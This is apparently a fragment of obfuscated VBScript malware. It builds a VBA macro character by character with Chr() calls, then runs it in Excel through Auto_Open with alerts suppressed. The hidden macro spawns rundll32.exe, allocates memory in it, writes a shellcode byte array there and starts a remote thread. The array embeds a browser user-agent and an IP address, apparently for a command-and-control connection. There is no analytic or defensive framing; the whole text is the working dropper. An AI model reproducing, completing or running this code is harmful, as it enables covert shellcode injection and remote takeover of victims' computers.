Chr(48)&Chr(50)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(49)&Chr(50)&Chr(44)&Chr(55)&Chr(53)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(50)&Chr(56)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(53)&Chr(44)&Chr(45)& _
Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(52)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(56)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(54)&Chr(56)&Chr(44)&Chr(51)&Chr(54)&Chr(44)&Chr(51)&Chr(54)&Chr(44)&Chr(57)& _
Chr(49)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(57)&Chr(49)&Chr(44)&Chr(57)&Chr(55)&Chr(44)&Chr(56)&Chr(57)&Chr(44)&Chr(57)&Chr(48)&Chr(44)&Chr(56)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(51)&Chr(50)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(57)&Chr(53)& _
Chr(44)&Chr(57)&Chr(48)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(49)&Chr(56)&Chr(44)&Chr(45)&Chr(50)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(50)&Chr(50)&Chr(44)&Chr(57)&Chr(51)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(49)&Chr(49)&Chr(48)&Chr(44)& _
Chr(49)&Chr(48)&Chr(49)&Chr(44)&Chr(49)&Chr(49)&Chr(54)&Chr(44)&Chr(48)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(49)&Chr(48)&Chr(53)&Chr(44)&Chr(49)&Chr(49)&Chr(48)&Chr(44)&Chr(49)&Chr(48)&Chr(53)&Chr(44)&Chr(56)&Chr(52)& _
Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(55)&Chr(54)&Chr(44)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(51)&Chr(56)&Chr(44)&Chr(55)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(45)&Chr(50)&Chr(52)&Chr(44)&Chr(45)& _
Chr(49)&Chr(50)&Chr(56)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(55)&Chr(55)&Chr(44)&Chr(49)&Chr(49)&Chr(49)&Chr(44)&Chr(49)&Chr(50)&Chr(50)&Chr(44)&Chr(49)&Chr(48)&Chr(53)&Chr(44)&Chr(49)&Chr(48)&Chr(56)&Chr(44)&Chr(49)&Chr(48)&Chr(56)& _
Chr(44)&Chr(57)&Chr(55)&Chr(44)&Chr(52)&Chr(55)&Chr(44)&Chr(53)&Chr(51)&Chr(44)&Chr(52)&Chr(54)&Chr(44)&Chr(52)&Chr(56)&Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(52)&Chr(48)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(49)&Chr(48)&Chr(53)&Chr(44)&Chr(49)&Chr(49)&Chr(48)& _
Chr(44)&Chr(49)&Chr(48)&Chr(48)&Chr(44)&Chr(49)&Chr(49)&Chr(49)&Chr(44)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(49)&Chr(49)&Chr(53)&Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(55)&Chr(56)&Chr(44)&Chr(56)&Chr(52)&Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(53)&Chr(52)&Chr(44)& _
Chr(52)&Chr(54)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(52)&Chr(57)&Chr(44)&Chr(53)&Chr(57)&Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(55)&Chr(57)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(53)&Chr(52)&Chr(44)&Chr(53)&Chr(50)&Chr(44)&Chr(53)&Chr(57)& _
Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(56)&Chr(52)&Chr(44)&Chr(49)&Chr(49)&Chr(52)&Chr(44)&Chr(49)&Chr(48)&Chr(53)&Chr(44)&Chr(49)&Chr(48)&Chr(48)&Chr(44)&Chr(49)&Chr(48)&Chr(49)&Chr(44)&Chr(49)&Chr(49)&Chr(48)&Chr(44)&Chr(49)&Chr(49)&Chr(54)&Chr(44)&Chr(52)& _
Chr(55)&Chr(44)&Chr(53)&Chr(53)&Chr(44)&Chr(52)&Chr(54)&Chr(44)&Chr(52)&Chr(56)&Chr(44)&Chr(53)&Chr(57)&Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(49)&Chr(49)&Chr(52)&Chr(44)&Chr(49)&Chr(49)&Chr(56)&Chr(44)&Chr(53)&Chr(56)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(52)& _
Chr(57)&Chr(44)&Chr(52)&Chr(54)&Chr(44)&Chr(52)&Chr(56)&Chr(44)&Chr(52)&Chr(49)&Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(49)&Chr(48)&Chr(56)&Chr(44)&Chr(49)&Chr(48)&Chr(53)&Chr(44)&Chr(49)&Chr(48)&Chr(55)&Chr(44)&Chr(49)&Chr(48)&Chr(49)& _
Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(55)&Chr(49)&Chr(44)&Chr(49)&Chr(48)&Chr(49)&Chr(44)&Chr(57)&Chr(57)&Chr(44)&Chr(49)&Chr(48)&Chr(55)&Chr(44)&Chr(49)&Chr(49)&Chr(49)&Chr(44)&Chr(48)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)& _
Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)& _
Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)& _
Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)& _
Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)& _
Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(56)&Chr(56)&Chr(44)& _
Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(48)&Chr(44)&Chr(56)&Chr(57)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(56)&Chr(55)&Chr(44)& _
Chr(56)&Chr(55)&Chr(44)&Chr(56)&Chr(49)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(53)&Chr(56)&Chr(44)&Chr(56)&Chr(54)&Chr(44)&Chr(49)&Chr(50)&Chr(49)&Chr(44)&Chr(45)&Chr(56)&Chr(57)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(45)& _
Chr(50)&Chr(49)&Chr(44)&Chr(49)&Chr(50)&Chr(49)&Chr(44)&Chr(57)&Chr(49)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(53)&Chr(53)&Chr(44)&Chr(56)&Chr(49)&Chr(44)&Chr(56)&Chr(49)&Chr(44)&Chr(49)&Chr(48)&Chr(54)&Chr(44)&Chr(51)&Chr(44)&Chr(56)&Chr(49)&Chr(44)& _
Chr(56)&Chr(49)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(56)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(56)&Chr(51)&Chr(44)&Chr(56)&Chr(48)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(56)&Chr(55)&Chr(44)& _
Chr(45)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(45)&Chr(57)&Chr(55)&Chr(44)&Chr(45)&Chr(53)&Chr(56)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(45)&Chr(50)&Chr(49)&Chr(44)&Chr(57)&Chr(56)&Chr(44)&Chr(56)&Chr(57)&Chr(44)&Chr(52)&Chr(57)& _
Chr(44)&Chr(45)&Chr(52)&Chr(54)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(48)&Chr(44)&Chr(50)&Chr(44)&Chr(57)&Chr(54)&Chr(44)&Chr(45)&Chr(49)&Chr(50)&Chr(52)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(56)&Chr(50)& _
Chr(44)&Chr(56)&Chr(49)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(56)&Chr(48)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(45)&Chr(50)&Chr(49)&Chr(44)&Chr(56)&Chr(53)&Chr(44)&Chr(52)&Chr(54)&Chr(44)&Chr(53)&Chr(57)&Chr(44)&Chr(45)&Chr(49)& _
Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(45)&Chr(53)&Chr(56)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(56)&Chr(55)&Chr(44)& _
Chr(56)&Chr(54)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(52)&Chr(53)&Chr(44)&Chr(54)&Chr(44)&Chr(50)&Chr(52)&Chr(44)&Chr(49)&Chr(50)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(50)&Chr(51)&Chr(44)&Chr(45)& _
Chr(54)&Chr(52)&Chr(44)&Chr(49)&Chr(49)&Chr(54)&Chr(44)&Chr(54)&Chr(56)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(50)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(48)&Chr(44)&Chr(49)&Chr(49)&Chr(54)&Chr(44)&Chr(52)&Chr(44)&Chr(32)& _
Chr(95)&Chr(10)&Chr(45)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(45)&Chr(55)&Chr(44)&Chr(45)&Chr(50)&Chr(49)&Chr(44)&Chr(57)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(45)&Chr(56)&Chr(54)&Chr(44)&Chr(45)&Chr(53)&Chr(57)&Chr(44)&Chr(45)&Chr(51)&Chr(48)&Chr(44)& _
Chr(57)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(45)&Chr(54)&Chr(51)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(54)&Chr(57)&Chr(44)&Chr(51)&Chr(51)&Chr(44)&Chr(57)&Chr(52)&Chr(44)& _
Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(49)&Chr(48)&Chr(54)&Chr(44)&Chr(55)&Chr(44)&Chr(56)&Chr(49)&Chr(44)&Chr(56)&Chr(54)&Chr(44)&Chr(56)& _
Chr(48)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(45)&Chr(55)&Chr(51)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(45)&Chr(51)&Chr(50)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(49)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(45)&Chr(54)& _
Chr(53)&Chr(44)&Chr(48)&Chr(44)&Chr(52)&Chr(55)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(53)&Chr(55)&Chr(44)&Chr(45)&Chr(53)&Chr(55)&Chr(44)&Chr(49)&Chr(49)&Chr(54)&Chr(44)&Chr(45)&Chr(54)&Chr(56)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(45)&Chr(49)&Chr(44)& _
Chr(45)&Chr(50)&Chr(49)&Chr(44)&Chr(50)&Chr(49)&Chr(44)&Chr(45)&Chr(50)&Chr(49)&Chr(44)&Chr(55)&Chr(51)&Chr(44)&Chr(45)&Chr(50)&Chr(52)&Chr(44)&Chr(45)&Chr(49)&Chr(48)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(44)& _
Chr(52)&Chr(55)&Chr(44)&Chr(49)&Chr(49)&Chr(51)&Chr(44)&Chr(56)&Chr(50)&Chr(44)&Chr(56)&Chr(49)&Chr(44)&Chr(55)&Chr(50)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(45)&Chr(49)&Chr(54)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(45)& _
Chr(55)&Chr(53)&Chr(44)&Chr(45)&Chr(57)&Chr(52)&Chr(44)&Chr(56)&Chr(54)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(49)&Chr(48)&Chr(54)&Chr(44)&Chr(54)&Chr(52)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(48)&Chr(44)&Chr(49)&Chr(54)& _
Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(54)&Chr(52)&Chr(44)&Chr(48)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(45)&Chr(57)&Chr(50)&Chr(44)& _
Chr(56)&Chr(51)&Chr(44)&Chr(45)&Chr(50)&Chr(55)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(48)&Chr(57)&Chr(44)&Chr(56)&Chr(51)&Chr(44)&Chr(56)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(45)&Chr(50)& _
Chr(53)&Chr(44)&Chr(56)&Chr(55)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(32)&Chr(95)&Chr(10)&Chr(48)&Chr(44)&Chr(51)&Chr(50)&Chr(44)&Chr(48)&Chr(44)&Chr(48)&Chr(44)&Chr(56)&Chr(51)&Chr(44)&Chr(56)&Chr(54)&Chr(44)&Chr(49)&Chr(48)&Chr(52)&Chr(44)&Chr(49)& _
Chr(56)&Chr(44)&Chr(45)&Chr(49)&Chr(48)&Chr(54)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(57)&Chr(44)&Chr(45)&Chr(51)&Chr(48)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(52)&Chr(51)&Chr(44)&Chr(45)&Chr(49)&Chr(50)&Chr(51)&Chr(44)&Chr(45)&Chr(54)&Chr(52)&Chr(44)& _
Chr(49)&Chr(49)&Chr(54)&Chr(44)&Chr(45)&Chr(53)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(49)&Chr(55)&Chr(44)&Chr(55)&Chr(44)&Chr(49)&Chr(44)&Chr(45)&Chr(54)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(50)&Chr(51)&Chr(44)&Chr(45)&Chr(54)&Chr(52)&Chr(44)&Chr(49)&Chr(49)& _
Chr(55)&Chr(44)&Chr(45)&Chr(50)&Chr(55)&Chr(44)&Chr(56)&Chr(56)&Chr(44)&Chr(45)&Chr(54)&Chr(49)&Chr(44)&Chr(45)&Chr(50)&Chr(52)&Chr(44)&Chr(53)&Chr(53)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(45)&Chr(49)&Chr(44)&Chr(32)&Chr(95)&Chr(10)& _
Chr(53)&Chr(54)&Chr(44)&Chr(52)&Chr(56)&Chr(44)&Chr(52)&Chr(54)&Chr(44)&Chr(53)&Chr(48)&Chr(44)&Chr(53)&Chr(51)&Chr(44)&Chr(53)&Chr(51)&Chr(44)&Chr(52)&Chr(54)&Chr(44)&Chr(53)&Chr(49)&Chr(44)&Chr(52)&Chr(54)&Chr(44)&Chr(52)&Chr(57)&Chr(44)&Chr(52)&Chr(56)& _
Chr(44)&Chr(53)&Chr(55)&Chr(44)&Chr(48)&Chr(41)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(73)&Chr(102)&Chr(32)&Chr(76)&Chr(101)&Chr(110)&Chr(40)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(40)&Chr(34)&Chr(80)&Chr(114)&Chr(111)&Chr(103)&Chr(114)& _
Chr(97)&Chr(109)&Chr(87)&Chr(54)&Chr(52)&Chr(51)&Chr(50)&Chr(34)&Chr(41)&Chr(41)&Chr(32)&Chr(62)&Chr(32)&Chr(48)&Chr(32)&Chr(84)&Chr(104)&Chr(101)&Chr(110)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(115)&Chr(80)&Chr(114)&Chr(111)& _
Chr(99)&Chr(32)&Chr(61)&Chr(32)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(40)&Chr(34)&Chr(119)&Chr(105)&Chr(110)&Chr(100)&Chr(105)&Chr(114)&Chr(34)&Chr(41)&Chr(32)&Chr(38)&Chr(32)&Chr(34)&Chr(92)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(87)&Chr(79)& _
Chr(87)&Chr(54)&Chr(52)&Chr(92)&Chr(92)&Chr(114)&Chr(117)&Chr(110)&Chr(100)&Chr(108)&Chr(108)&Chr(51)&Chr(50)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(34)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(69)&Chr(108)&Chr(115)&Chr(101)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)& _
Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(115)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(32)&Chr(61)&Chr(32)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(40)&Chr(34)&Chr(119)&Chr(105)&Chr(110)&Chr(100)&Chr(105)&Chr(114)&Chr(34)&Chr(41)&Chr(32)&Chr(38)&Chr(32)& _
Chr(34)&Chr(92)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(51)&Chr(50)&Chr(92)&Chr(92)&Chr(114)&Chr(117)&Chr(110)&Chr(100)&Chr(108)&Chr(108)&Chr(51)&Chr(50)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(34)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(69)& _
Chr(110)&Chr(100)&Chr(32)&Chr(73)&Chr(102)&Chr(10)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(61)&Chr(32)&Chr(82)&Chr(117)&Chr(110)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(40)&Chr(115)&Chr(78)&Chr(117)&Chr(108)&Chr(108)&Chr(44)& _
Chr(32)&Chr(115)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(48)&Chr(38)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(48)&Chr(38)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)& _
Chr(108)&Chr(32)&Chr(49)&Chr(38)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(52)&Chr(38)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(48)&Chr(38)&Chr(44)&Chr(32)&Chr(115)&Chr(78)&Chr(117)&Chr(108)&Chr(108)&Chr(44)& _
Chr(32)&Chr(115)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(44)&Chr(32)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(41)&Chr(10)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(114)&Chr(119)&Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)&Chr(32)&Chr(61)&Chr(32)&Chr(65)&Chr(108)& _
Chr(108)&Chr(111)&Chr(99)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(40)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(46)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(44)&Chr(32)&Chr(48)&Chr(44)&Chr(32)&Chr(85)&Chr(66)&Chr(111)&Chr(117)& _
Chr(110)&Chr(100)&Chr(40)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(41)&Chr(44)&Chr(32)&Chr(38)&Chr(72)&Chr(49)&Chr(48)&Chr(48)&Chr(48)&Chr(44)&Chr(32)&Chr(38)&Chr(72)&Chr(52)&Chr(48)&Chr(41)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(70)& _
Chr(111)&Chr(114)&Chr(32)&Chr(111)&Chr(102)&Chr(102)&Chr(115)&Chr(101)&Chr(116)&Chr(32)&Chr(61)&Chr(32)&Chr(76)&Chr(66)&Chr(111)&Chr(117)&Chr(110)&Chr(100)&Chr(40)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(41)&Chr(32)&Chr(84)&Chr(111)&Chr(32)&Chr(85)& _
Chr(66)&Chr(111)&Chr(117)&Chr(110)&Chr(100)&Chr(40)&Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(41)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(109)&Chr(121)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(32)&Chr(61)&Chr(32)& _
Chr(109)&Chr(121)&Chr(65)&Chr(114)&Chr(114)&Chr(97)&Chr(121)&Chr(40)&Chr(111)&Chr(102)&Chr(102)&Chr(115)&Chr(101)&Chr(116)&Chr(41)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(61)&Chr(32)&Chr(87)&Chr(114)& _
Chr(105)&Chr(116)&Chr(101)&Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(40)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(46)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(44)&Chr(32)&Chr(114)&Chr(119)&Chr(120)&Chr(112)&Chr(97)&Chr(103)&Chr(101)& _
Chr(32)&Chr(43)&Chr(32)&Chr(111)&Chr(102)&Chr(102)&Chr(115)&Chr(101)&Chr(116)&Chr(44)&Chr(32)&Chr(109)&Chr(121)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(44)&Chr(32)&Chr(49)&Chr(44)&Chr(32)&Chr(66)&Chr(121)&Chr(86)&Chr(97)&Chr(108)&Chr(32)&Chr(48)&Chr(38)&Chr(41)&Chr(10)& _
Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(78)&Chr(101)&Chr(120)&Chr(116)&Chr(32)&Chr(111)&Chr(102)&Chr(102)&Chr(115)&Chr(101)&Chr(116)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(114)&Chr(101)&Chr(115)&Chr(32)&Chr(61)&Chr(32)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)& _
Chr(83)&Chr(116)&Chr(117)&Chr(102)&Chr(102)&Chr(40)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(46)&Chr(104)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(44)&Chr(32)&Chr(48)&Chr(44)&Chr(32)&Chr(48)&Chr(44)&Chr(32)&Chr(114)&Chr(119)&Chr(120)&Chr(112)& _
Chr(97)&Chr(103)&Chr(101)&Chr(44)&Chr(32)&Chr(48)&Chr(44)&Chr(32)&Chr(48)&Chr(44)&Chr(32)&Chr(48)&Chr(41)&Chr(10)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(83)&Chr(117)&Chr(98)&Chr(10)&Chr(83)&Chr(117)&Chr(98)&Chr(32)&Chr(65)&Chr(117)&Chr(116)&Chr(111)&Chr(79)&Chr(112)& _
Chr(101)&Chr(110)&Chr(40)&Chr(41)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(65)&Chr(117)&Chr(116)&Chr(111)&Chr(95)&Chr(79)&Chr(112)&Chr(101)&Chr(110)&Chr(10)&Chr(69)&Chr(110)&Chr(100)&Chr(32)&Chr(83)&Chr(117)&Chr(98)&Chr(10)&Chr(83)&Chr(117)&Chr(98)&Chr(32)&Chr(87)& _
Chr(111)&Chr(114)&Chr(107)&Chr(98)&Chr(111)&Chr(111)&Chr(107)&Chr(95)&Chr(79)&Chr(112)&Chr(101)&Chr(110)&Chr(40)&Chr(41)&Chr(10)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(65)&Chr(117)&Chr(116)&Chr(111)&Chr(95)&Chr(79)&Chr(112)&Chr(101)&Chr(110)&Chr(10)&Chr(69)&Chr(110)&Chr(100)& _
Chr(32)&Chr(83)&Chr(117)&Chr(98)&Chr(10)
objExcel.DisplayAlerts = False
on error resume next
objExcel.Run "Auto_Open"
objWorkbook.Close False
